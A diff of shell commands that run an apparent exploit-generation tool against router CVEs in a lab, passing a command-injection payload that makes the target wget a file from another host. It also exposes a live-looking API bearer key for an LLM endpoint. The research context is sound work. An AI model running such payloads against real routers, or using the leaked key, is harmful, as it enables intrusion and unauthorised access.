@@ -16,8 +16,53 @@ python3 -m PoCGen.cli \
   --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
   --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/*.c" \
   --target http://192.168.6.2 \
+  --CVENumber CVE-2025-9149 \
   --binary /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi \
   --ida-mcp-url http://127.0.0.1:8745/mcp \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
+
+
+curl -sS -o /tmp/models.json -w "status=%{http_code} time=%{time_total}s\n" \
+  "http://222.20.126.36:8000/v1/models" \
+  -H "Authorization: Bearer sk-bis1XXH4apReMIL4RDsghVHW5igk4f01" \
+  -H "Content-Type: application/json"
+
+curl -sS -o /tmp/chat.json -w "status=%{http_code} time=%{time_total}s\n" \
+  "http://222.20.126.36:8000/v1/chat/completions" \
+  -H "Authorization: Bearer sk-bis1XXH4apReMIL4RDsghVHW5igk4f01" \
+  -H "Content-Type: application/json" \
+  -d '{"model":"glm-5.1-fp8","messages":[{"role":"user","content":"reply pong"}],"temperature":0,"max_tokens":128}'
+
+  python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/TotolinkA3300R/CVE-2024-24325/desc.txt \
+  --code "/home/li/test_env/second_data/TotolinkA3300R/CVE-2024-24325/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --CVENumber CVE-2024-24325 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
+
+python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/TotolinkA3300R/CVE-2026-5176/desc.txt \
+  --code "/home/li/test_env/second_data/TotolinkA3300R/CVE-2026-5176/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --CVENumber CVE-2026-5176 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
+
+python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/TotolinkA3300R/CVE-2026-5176/desc.txt \
+  --target http://192.168.6.2 \
+  --CVENumber CVE-2026-5176 \
   --probe-target --browser-login \
   --login-url http://192.168.6.2 \
   --login-username admin --login-password admin \
